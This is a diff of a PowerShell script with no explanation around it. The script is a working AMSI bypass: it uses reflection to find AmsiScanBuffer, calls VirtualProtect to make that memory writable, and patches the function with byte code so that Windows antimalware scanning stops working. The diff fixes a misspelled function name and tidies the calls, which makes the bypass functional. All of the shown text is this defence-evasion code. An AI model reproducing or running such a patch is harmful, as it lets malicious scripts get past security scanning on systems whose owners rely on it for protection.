@@ -5,11 +5,9 @@ function LookupFunc {
      Equals('System.dll')
      }).GetType('Microsoft.Win32.UnsafeNativeMethods')
     $tmp=@()
-    $assem.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$tmp+=$_}}
-    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
-@($moduleName)), $functionName))
+    $assem.GetMethods() | ForEach-Object {If($_.Name -like "GetProcAddress") {$tmp+=$_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
 }
-
 
 function getDelegateType {
     Param (
@@ -17,11 +15,9 @@ function getDelegateType {
      $func, [Parameter(Position = 1)] [Type] $delType = [Void]
     )
     $type = [AppDomain]::CurrentDomain.
-    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
-[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
     DefineDynamicModule('InMemoryModule', $false).
-    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
-    AutoClass', [System.MulticastDelegate])
+    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
 
   $type.
     DefineConstructor('RTSpecialName, HideBySig, Public',
@@ -34,9 +30,8 @@ $func). SetImplementationFlags('Runtime, Managed')
     return $type.CreateType()
 }
 
-[IntPtr]$funcAddr = LookupFunc "amsi.dll" "AsmiScanBuffer"
-$oldProtectionBuffer = 0
-$virtual_protect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
-$virtual_protect.Invoke($funcAddr, 3, 0x40, [ref] $oldProtectionBuffer)
+[IntPtr]$funcAddr = LookupFunc "amsi.dll" "AmsiScanBuffer"
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref] 0)
 $buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 12)
